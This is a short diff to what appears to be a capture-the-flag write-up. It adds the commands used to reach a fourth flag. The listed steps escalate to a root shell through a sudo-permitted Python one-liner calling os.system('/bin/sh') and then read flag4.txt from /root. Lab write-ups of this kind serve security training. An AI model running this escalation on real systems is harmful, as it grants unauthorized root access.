@@ -80,4 +80,6 @@ Flag4.txt:
 
 Commands used:
 - sudo python -c 'import os; os.system("/bin/sh")'
-- 
+- cd /root
+- ls
+- cat flag4.txt
